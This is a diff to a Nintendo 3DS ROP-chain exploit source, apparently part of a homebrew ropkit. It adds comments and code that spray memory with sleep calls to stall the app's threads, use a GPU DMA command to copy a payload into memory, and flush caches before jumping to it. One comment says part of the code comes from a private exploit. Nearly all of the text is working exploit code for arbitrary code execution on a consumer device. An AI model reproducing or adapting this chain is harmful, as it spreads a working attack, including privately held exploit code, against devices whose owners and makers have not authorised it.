@@ -39,13 +39,18 @@
 @CALLFUNC_R0R1 svcSleepThread, 0x80000000,0
 @ROPMACRO_WRITEWORD GSPTHREAD_OBJECTADDR+0x77, 0x1
 
-CALLFUNC_NOSP MEMSET32_OTHER+4, 0x0ffff800, 0x7f0, svcSleepThread, 0
+@ Lets kill these two threads before they crash the whole app!
+
+@This is the main thread, just spam the current SP range with svcSleepThread. Sloppy and lazy but works OK, but sleepThread could expire in 5 minutes or 50 years based on unknown r1 value. Ill confirm this later, but time seems sufficiant for now.
+CALLFUNC_NOSP MEMSET32_OTHER+4, 0x0ffff800, 0x7f0, svcSleepThread, 0 
+@These memsets sprays are for the 2nd thread to kill. Its a sub-thread, but no less dangerous!
 CALLFUNC_NOSP MEMSET32_OTHER+4, 0x148d5b88-0x200, 0x210, 0x148d5b88, 0
 CALLFUNC_NOSP MEMSET32_OTHER+4, 0x148d5b88+0x10, 0x100, svcSleepThread, 0
 
 
 
 #endif
+@We are going to skip calculating the following linearmem jump address code for new/old 3ds and just have it hardcoded. Space limitations are the reason here and I want to avoid reading ropkit from extdata. May reconsider later.
 /*
 @CALLFUNC_NOSP MEMCPY, ROPKIT_BINLOAD_ADDR, 0x00381800, ROPKIT_BINLOAD_SIZE, 0
 
@@ -70,12 +75,15 @@ ROP_LOADR0_FROMADDR (ROPKIT_TMPDATA+0x24)
 .word 0
 @.word misc_store
 */
+@ Note: this preceding code is from a private exploit! :o
 
+@ Only changes that have to be done for new3ds compat are add 0x3c00000 to the first arg here and replace the otherapp in 3ds_ropkit with a new3ds version.
 CALL_GXCMD4 ROPKIT_BINLOAD_ADDR, 0x17fe0000, 0x2000
 
-@ Wait 0.1s for the transfers to finish.
+@ Wait 0.1s for the transfers to finish. Could probably increase this.
 CALLFUNC_R0R1 svcSleepThread, 100000, 0
 
+@ cache maintenance
 #ifdef ROPKIT_BEFOREJUMP_CACHEBUFADDR//Try to get cache invalidated/whatever for otherapp via accessing+flushing memory in linearmem.
 CALLFUNC_NOSP MEMCPY, ROPKIT_BEFOREJUMP_CACHEBUFADDR, ROPKIT_BEFOREJUMP_CACHEBUFADDR+0x100, ROPKIT_BEFOREJUMP_CACHEBUFSIZE, 0
 CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPKIT_BEFOREJUMP_CACHEBUFADDR, ROPKIT_BEFOREJUMP_CACHEBUFSIZE, 0, 0
